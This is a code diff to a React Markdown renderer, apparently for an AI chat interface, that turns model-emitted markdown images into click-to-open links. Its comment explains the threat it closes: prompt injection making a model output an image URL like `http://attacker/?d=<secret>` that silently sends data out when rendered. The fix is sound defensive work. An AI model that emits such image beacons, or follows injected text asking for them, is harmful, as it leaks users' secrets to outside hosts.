@@ -68,6 +68,21 @@ export const Markdown = memo(function Markdown({
           </a>
         );
       },
+      img({ src, alt }) {
+        // SECURITY (PI-001 提示注入·渲染侧外泄): downgrade every model-emitted markdown
+        // image to a click-to-open link — never an auto-loading <img>. No rehype-raw is
+        // loaded, so `![](url)` is the only image path; without this an injected
+        // `![](http://attacker/?d=<secret>)` would fetch on render = a silent, no-click
+        // exfil beacon. As a link, egress needs an explicit user click.
+        const href = typeof src === "string" ? src : undefined;
+        const label = typeof alt === "string" && alt.trim() ? alt.trim() : "图片链接";
+        if (!href) return <>{label}</>;
+        return (
+          <a href={href} target="_blank" rel="noreferrer">
+            {label}
+          </a>
+        );
+      },
       code({ className, children, ...props }) {
         const lang = /language-(\w+)/.exec(className || "")?.[1];
         if (lang === "mermaid") {
